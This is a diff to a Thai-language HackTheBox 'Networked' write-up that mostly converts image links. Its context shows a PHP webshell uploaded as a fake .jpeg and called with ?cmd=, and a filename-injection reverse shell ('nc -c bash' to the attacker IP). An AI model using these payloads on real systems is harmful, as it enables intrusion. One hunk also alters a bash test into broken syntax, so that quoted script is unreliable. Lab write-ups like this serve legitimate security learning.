@@ -27,12 +27,12 @@ Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds
 ```
 
 ## TCP 80 
-![[Challenge/HTB Challenge/Networked/IMG/002.png]]
+![](./IMG/002.png)
 
-![[Challenge/HTB Challenge/Networked/IMG/001.png]]
+![](./IMG/001.png)
 
 ภายใต้ /backup มีไฟล์ backup.tar อยู่
-![[Challenge/HTB Challenge/Networked/IMG/003.png]]
+![](./IMG/003.png)
 
 หากสังเกตดูจะมีไฟล์ upload.php ซึ่งจะมีตัวแปรชื่อ myFile และให้ลองทดสอบเข้าไปใน web จริง 
 ```php
@@ -89,11 +89,11 @@ if( isset($_POST['submit']) ) {
 ?>
 
 ```
-![[Challenge/HTB Challenge/Networked/IMG/004.png]]
+![](./IMG/004.png)
 
 เมื่อลองทดสอบ upload ภาพของเราจะถูกแสดงอยู่ภายใต้ photos.php 
 
-![[Challenge/HTB Challenge/Networked/IMG/005.png]]
+![](./IMG/005.png)
 
 # Shell as apache 
 ## upload webshell 
@@ -103,11 +103,11 @@ if( isset($_POST['submit']) ) {
 ```
 
 รูปด้านล่างเป็นไฟล์ cat.php.jpeg และทำการเพิ่ม php shell ไปในไฟล์
-![[Challenge/HTB Challenge/Networked/IMG/006.png]]
+![](./IMG/006.png)
 
 จะเห็นได้ว่าเราสามารถ Upload เข้าไปได้ 
 
-![[Challenge/HTB Challenge/Networked/IMG/007.png]]
+![](./IMG/007.png)
 
 
 และเราจะเห็นได้ว่าไฟล์ของเราอยู่ภายใต้ uploads/ ซึ่งทำให้เราสามารถเข้าถึงไฟล์ดังกล่าวได้ 
@@ -116,7 +116,7 @@ if( isset($_POST['submit']) ) {
 http://10.10.10.146/uploads/10_10_14_6.php.jpeg?cmd=id
 ```
 
-![[Challenge/HTB Challenge/Networked/IMG/008.png]]
+![](./IMG/008.png)
 
 
 ```bash
@@ -289,7 +289,7 @@ PHP ใช้ exec() กับชื่อไฟล์จากโฟลเด�
 touch ';nc -c bash 10.10.14.6 444'
 ```
 
-![[Challenge/HTB Challenge/Networked/IMG/009.png]]
+![](./IMG/009.png)
 
 # Pri to ROOT
 หากเราใช้คำสั่ง sudo -l จะพบว่ามีโปรแกรมภายใต้ path /usr/local/sbin/changename.sh สามารถรันได้ด้วยสิทธิ root 
@@ -327,7 +327,7 @@ regexp="^[a-zA-Z0-9_\ /-]+$"
 for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
         echo "interface $var:"
         read x
-        while [[ ! $x =~ $regexp ]]; do
+        while [[ ! $x =~ $regexp ); do
                 echo "wrong input, try again"
                 echo "interface $var:"
                 read x
